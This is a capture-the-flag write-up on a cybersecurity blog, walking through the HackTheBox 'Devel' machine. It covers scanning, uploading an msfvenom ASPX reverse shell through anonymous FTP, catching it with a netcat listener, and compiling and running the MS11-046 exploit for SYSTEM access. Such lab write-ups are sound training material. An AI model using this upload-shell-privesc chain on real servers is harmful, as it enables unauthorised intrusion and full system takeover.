<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="d ago"><meta name="hour-prompt" content="hr ago"><meta name="minute-prompt" content="min ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HTB: Devel" /><meta name="author" content="Nullprism" /><meta property="og:locale" content="en" /><meta name="description" content="Intro" /><meta property="og:description" content="Intro" /><link rel="canonical" href="https://blog.nullprism.io//posts/htb-devel/" /><meta property="og:url" content="https://blog.nullprism.io//posts/htb-devel/" /><meta property="og:site_name" content="Nullprism" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-04T21:10:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB: Devel" /><meta name="twitter:site" content="@nullprism" /><meta name="twitter:creator" content="@Nullprism" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Nullprism"},"headline":"HTB: Devel","dateModified":"2021-08-04T21:42:50-05:00","datePublished":"2021-08-04T21:10:00-05:00","url":"https://blog.nullprism.io//posts/htb-devel/","description":"Intro","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.nullprism.io//posts/htb-devel/"},"@context":"https://schema.org"}</script><title>HTB: Devel | Nullprism</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Nullprism"><meta name="application-name" content="Nullprism"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="http://wonderworlds.org/images/crystal_fantasy/fantasy-crystal-goldwater1.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Nullprism</a></div><div class="site-subtitle font-italic">Yet Another Cybersecurity Blog. But its more for me, than you.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/nullprism" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/nullprism" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['nullprism','nullprism.io'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB: Devel</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB: Devel</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Nullprism </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Aug 4, 2021, 9:10 PM -0500" >Aug 4<i class="unloaded">2021-08-04T21:10:00-05:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Aug 4, 2021, 9:42 PM -0500" >Aug 4<i class="unloaded">2021-08-04T21:42:50-05:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1898 words">10 min read</span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 200'%3E%3C/svg%3E" data-proofer-ignore data-src="/assets/img/htb/devel/devel_title_card.png" class="preview-img" alt="Devel Title Card" width="500" height="200"><h2 id="intro">Intro</h2><p>I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don’t have any reason not to. Community consensus seems to be that TJNull’s list of <a href="https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#vulnerable-machines">“OSCP-like”</a> boxes is excellent prep. So I figured I’d start with that. Its broken down by Linux and Windows. I always feel more comfortable on Linux than I do Windows, so I’m going to start doing all the Windows ones first.</p><h2 id="reconnaissance">Reconnaissance</h2><h3 id="initial-scan">Initial Scan</h3><p>I’m going to modify my initial reconnoitre scan this time around, by adding the <code class="language-plaintext highlighter-rouge">--quick</code> flag.. I’ve noticed the repo has aged a bit and I’ve had some follow on tool failures during automated scans, so I’m going to manually do service enumerations after it does its scans.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>reconnoitre <span class="nt">-t</span> 10.129.193.22 <span class="nt">-o</span> <span class="nb">.</span> <span class="nt">--services</span> <span class="nt">--quick</span>
</pre></table></code></div></div><h3 id="scan-results">Scan Results</h3><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>Nmap scan report for 10.129.193.22
Host is up (0.062s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</pre></table></code></div></div><h2 id="enumeration">Enumeration</h2><h3 id="initial-assessments">Initial Assessments</h3><p>Based on our results we have a few interesting things we can derive about the box immediately:</p><ul><li>Its most likely a Windows 2008 R2 server based on the <a href="https://en.wikipedia.org/wiki/Internet_Information_Services">Microsoft IIS versioning</a><li>It is hosting a web server<li>Its hosting a FTP server<li>The FTP server does allow anonymous login</ul><h3 id="http">HTTP</h3><p>I generally tend to start with web servers first, as they may yield OSINT or other harvestable information about the target that will be valuable. Browsing to the target webserver displays a default config IIS splash with no interesting HTML source when viewed. Nothing too exciting.</p><p><img data-proofer-ignore data-src="/assets/img/htb/devel/devel_web_server_homepage.png" alt="Web Server Homepage" /></p><p>If the box potentially is a default configured IIS server, I’d like to directory crawl it to see if there are any misconfigured goodies potentially available. <code class="language-plaintext highlighter-rouge">gobuster</code> is generally my preferred tool for something like this.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gobuster <span class="nb">dir</span> <span class="nt">-url</span> http://10.129.183.22:80/ <span class="nt">-s</span> <span class="s1">'200,204,301,207,403,500'</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-e</span> | <span class="nb">tee</span> ./gobuster_10.129.183.22.txt
</pre></table></code></div></div><p>This runs gobuster in directory mode against the target, scanning for returns only on the HTTP return codes we specified, and using the word list we specified. You can arguably use <code class="language-plaintext highlighter-rouge">directory-list-lowercase-2.3-medium.txt</code> as well, but it’ll take a lot longer and I have a low expectation of success given the configuration. If we see something potentially interesting, I may rescan more in-depth.</p><ul><li>Side Note: I’m a huge believer in piping my output to a file, when using tools. I don’t like to rely on the terminal to as a reference. If you accidentally close your session and you aren’t logging, or you do something output intensive, referencing your tool output is super annoying. I like having it in a file I can always pull up. <code class="language-plaintext highlighter-rouge">tee</code> accomplishes this for me with tools that don’t have output direction flags.</ul><p><img data-proofer-ignore data-src="/assets/img/htb/devel/devel_gobuster_results.png" alt="Gobuster Results" /></p><p>As I kind of suspected, we don’t find much of anything exciting; a directory structure that returned <code class="language-plaintext highlighter-rouge">HTTP 301</code>, which is forbidden, anyways.</p><p>I’m not super experienced with IIS 7.5, so I’d like to try a bit more enumeration with <code class="language-plaintext highlighter-rouge">nikto</code> and see if there’s anything I’m potentially missing.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nikto <span class="nt">-host</span> 10.129.193.22 <span class="nt">-port</span> 80 <span class="nt">-output</span> nikto_10.129.193.22_80.txt
</pre></table></code></div></div><p>Results from nikto (which I failed to screenshot, because I suck), return that its basically a default configured IIS 7.5 webserver. Nothing of note.</p><p>At this point I’m going to set aside HTTP and look at FTP, as it seems to have a lot more potential juice in it, considering the scan results.</p><h3 id="ftp">FTP</h3><p>We already know the server has anonymous log in available, but I want to see if there are any other potential vulnerabilities at play here before I jump that down that glaring rabbit hole.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-vv</span> <span class="nt">-p21</span> <span class="nt">--script</span><span class="o">=</span>ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <span class="nt">-oA</span> <span class="s1">'10.129.193.22/scans/10.129.193.22_21_ftp'</span> 10.129.193.22
</pre></table></code></div></div><p>The results show no, just the anonymous FTP. Let’s log in.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ftp 10.129.193.22
</pre></table></code></div></div><ul><li>Enter <code class="language-plaintext highlighter-rouge">anonymous</code> as the user name and leave the password blank</ul><p><img data-proofer-ignore data-src="/assets/img/htb/devel/devel_ftp_anon_login.png" alt="Anonymous FTP Login" /></p><p>Well, we’re in! Not only are we in, but we appear to be at the wwwroot, based on the files we can see. The first thing I always want to know as an anonymous user is, can I upload? You can witness in the screenshot above, me uploading an empty <code class="language-plaintext highlighter-rouge">test.txt</code> file to see if it goes through.</p><h2 id="exploitation">Exploitation</h2><h3 id="initial-assessment">Initial Assessment</h3><p>With the ability to upload as the anonymous FTP user, we have the ability to deliver files to the webroot of the target, a web shell is a viable option here. There are plenty of great asp/aspx web shells on the web, but I usually just generate mine with <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p><h3 id="web-shell-payload-generation">Web Shell Payload Generation</h3><p><img data-proofer-ignore data-src="/assets/img/htb/devel/devel_web_shell_generate.png" alt="Web Shell Generation" /></p><p>This command is:</p><ul><li>Generating a reverse TCP shell payload<li>Setting the callback to our attack platform on port 4443<li>Setting the format to be aspx since we are delivering this to an IIS Web Server<li>Outputting it all to a file named <code class="language-plaintext highlighter-rouge">cargo.aspx</code></ul><h3 id="web-shell-delivery">Web Shell Delivery</h3><p>Time to upload it to the target.</p><p><img data-proofer-ignore data-src="/assets/img/htb/devel/devel_web_shell_deliver.png" alt="Web Shell Delivery" /></p><h3 id="web-shell-execution">Web Shell Execution</h3><p>Now to setup our listener to catch the callback, in an fresh terminal session:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc <span class="nt">-nvlp</span> 4443
</pre></table></code></div></div><p>After that, we just have to use our browser to <code class="language-plaintext highlighter-rouge">http://10.129.193.22/cargo.aspx</code> to launch the shell.</p><h3 id="shell">Shell</h3><p>And we have shell.</p><p><img data-proofer-ignore data-src="/assets/img/htb/devel/devel_shell_catch.png" alt="Devel Shell Catch" /></p><h2 id="post-exploitation">Post-Exploitation</h2><h3 id="initial-assessments-1">Initial Assessments</h3><p>Whenever I get a shell, I always immediately want to know where I landed and who I landed as. Based on the screenshot above, you can see from the <code class="language-plaintext highlighter-rouge">whoami</code> and the <code class="language-plaintext highlighter-rouge">ipconfig</code> that I am on the intended target and I am the <strong>IIS APPPOOL\WEB</strong> user. This user is going to be very restricted in terms of what it can access (definitely not the user and root flags), but let’s run a bit more box enumeration before we start looking at privesc, with <code class="language-plaintext highlighter-rouge">systeminfo</code>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre>Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 
System Boot Time:          4/8/2021, 11:11:50 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.449 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.533 MB
Virtual Memory: In Use:    608 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.193.22
                                 [02]: fe80::b92c:611f:da01:488e
                                 [03]: dead:beef::5120:d2c9:2978:785f
                                 [04]: dead:beef::b92c:611f:da01:488e
</pre></table></code></div></div><p>A couple of interesting points:</p><ul><li>Not a 2008 R2 box, but a Windows 7 Enterprise one<li>x64 Processor but x86 based PC<li>Build 7600</ul><h2 id="privilege-escalation">Privilege Escalation</h2><h3 id="initial-assessments-2">Initial Assessments</h3><p>We are going to need a lot more enumeration and information about this box before we even start thinking about slinging privesc attacks at it. winPEASs from the <a href="https://github.com/carlospolop/PEASS-ng">Privilege Escalation Awesome Scripts Suite</a> is my usual go to for something like there. There are, of course, tons of other available tools you can use, I’ve just found this one to be consistent, low maintenance, easy to deploy and above all, maintained.</p><h3 id="winpeas">winPEAS</h3><p>Let’s put winPEAS on the target via our anonymous FTP access.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>nullprism㉿granite<span class="o">)</span>-[~/htb/devel/10.129.193.22/exploit]
└─<span class="nv">$ </span><span class="nb">cp</span> /opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/binaries/x86/Release/winPEASx86.exe <span class="nb">.</span>
</pre></table></code></div></div><p>From there, we’ll attempt to execute from our web shell. Maybe you’ll have different luck, but I was ultimately unable to get the x86 to execute on the target, so I swapped to the <code class="language-plaintext highlighter-rouge">.bat</code> version of winPEAS, uploaded it via FTP and executed it without issue on the target.</p><h3 id="winpeas-results">winPEAS Results</h3><p>winPEAS will tell you <em>a lot of things</em>. In this particular case, we are most interested in this section of the output. Its a list of all the missing patches on the system and potential vulnerabilities associated with them.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>[i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)
MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)
MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)
MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)
MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)
MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)
MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)
MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)
MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)
MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)
MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)
MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)
MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)
MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)
MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)
MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)
MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)
MS04-020 patch is NOT installed 2K/SP4-POSIX)
MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)
MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)
MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)
MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)
MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)
MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)
MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)
</pre></table></code></div></div><h3 id="finding-a-privesc">Finding a PrivEsc</h3><p>We can just start at the top with <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-080">MS11-080</a>, related to the <code class="language-plaintext highlighter-rouge">afd.sys</code> vector.</p><p>Time to search for viable exploits or POCs via the <code class="language-plaintext highlighter-rouge">exploitdb</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>searchsploit afd.sys
</pre></table></code></div></div><p>We actually find two viable POCs, written in C. Upon research, it appears <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046">MS11-046</a>, which is an earlier version of the same vulnerability is probably more appropriate for our use case, as the POC code specifically references being tested with the specific build of our target machine.</p><p><img data-proofer-ignore data-src="/assets/img/htb/devel/devel_poc_privesc_targets.png" alt="POC Header Target List" /></p><p>Use <code class="language-plaintext highlighter-rouge">searchsploit</code> to pull this code for further use (also hosted on <a href="https://github.com/nullprism/htb-boxes">my github</a> in case you need to review it):</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>searchsploit <span class="nt">-m</span> 40564
</pre></table></code></div></div><h3 id="building-the-privesc">Building the PrivEsc</h3><p>According to the directions in the source, we need to compile the code with our linux host for windows with the following command:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>i686-w64-mingw32-gcc MS11-046.c <span class="nt">-o</span> MS11-046.exe <span class="nt">-lws2_32</span>
</pre></table></code></div></div><p>Based on some research, I’ll need to install the <code class="language-plaintext highlighter-rouge">mingw-w64</code> package on my AP in order to accomplish this.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>apt <span class="nb">install </span>mingw-w64
</pre></table></code></div></div><p>After that, compiling seems to go off without a hitch, and no warnings/errors.</p><h3 id="deliver-the-privesc--ftp-quicks">Deliver the PrivEsc &amp; FTP Quicks</h3><p>All that remains is to use the FTP vector to push the freshly compiled exploit to the target and then use the web shell to execute it.</p><p><img data-proofer-ignore data-src="/assets/img/htb/devel/devel_ftp_binary_mode.png" alt="Deliver PrivEsc" /></p><p>Side Note:</p><ul><li>This is something learned the hard way previously in my career. If you are going to upload a binary via FTP, make sure you put the FTP session in <code class="language-plaintext highlighter-rouge">binary</code> transfer mode first. Or your upload will succeed, but never execute and you won’t know why. You’ll then pull your hair out for hours. Save your hair, and your time….and your sanity.</ul><h3 id="execute-privesc">Execute PrivEsc</h3><p><img data-proofer-ignore data-src="/assets/img/htb/devel/devel_privesc_execute.png" alt="Execute Privesc" /></p><p><code class="language-plaintext highlighter-rouge">whoami</code>? I am ROOT. Well, <strong>NT AUTHORITY\SYSTEM</strong>. Let’s grab flags!</p><h2 id="flags">Flags</h2><p><img data-proofer-ignore data-src="/assets/img/htb/devel/devel_user_flag.png" alt="User Flag" /></p><p><img data-proofer-ignore data-src="/assets/img/htb/devel/devel_root_flag.png" alt="Root Flag" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/oscp-like/" class="post-tag no-text-decoration" >oscp-like</a> <a href="/tags/oscp-prep/" class="post-tag no-text-decoration" >oscp prep</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/walkthrough/" class="post-tag no-text-decoration" >walkthrough</a> <a href="/tags/devel/" class="post-tag no-text-decoration" >devel</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/tags/iis/" class="post-tag no-text-decoration" >iis</a> <a href="/tags/web-shell/" class="post-tag no-text-decoration" >web shell</a> <a href="/tags/httpd/" class="post-tag no-text-decoration" >httpd</a> <a href="/tags/ms11-080/" class="post-tag no-text-decoration" >ms11-080</a> <a href="/tags/ms11-046/" class="post-tag no-text-decoration" >ms11-046</a> <a href="/tags/msfvenom/" class="post-tag no-text-decoration" >msfvenom</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/reconnoitre/" class="post-tag no-text-decoration" >reconnoitre</a> <a href="/tags/anonymous/" class="post-tag no-text-decoration" >anonymous</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB: Devel - Nullprism&url=https://blog.nullprism.io//posts/htb-devel/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB: Devel - Nullprism&u=https://blog.nullprism.io//posts/htb-devel/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" 